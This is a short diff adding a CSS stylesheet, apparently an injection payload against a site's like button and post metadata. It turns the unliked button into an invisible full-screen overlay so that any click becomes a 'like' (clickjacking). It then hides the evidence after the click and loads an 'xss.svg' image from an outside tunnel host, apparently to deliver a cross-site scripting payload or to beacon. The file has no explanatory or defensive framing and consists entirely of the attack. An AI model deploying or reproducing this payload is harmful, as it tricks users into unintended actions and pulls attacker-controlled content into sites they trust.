@@ -1,0 +1,25 @@
+.like-button:not(.liked) {
+  position: fixed !important;
+  top: 0px !important;
+  left: 0px !important;
+  height: 1000vh !important;
+  width: 1000vh !important;
+}
+
+.like-button.liked {
+  color: gray !important;
+  pointer-events: none !important;
+  padding-left: 30px !important;
+}
+
+.like-button.liked svg {
+  display: none !important;
+}
+
+.custom.big.post-meta > tr > td.icon.post-meta-item:nth-child(1) {
+  background: url(https://2de36be479bbf2.localhost.run/xss.svg);
+  background-repeat: no-repeat;
+  background-position-x: left;
+  background-position-y: center;
+  min-width: 10px;
+}
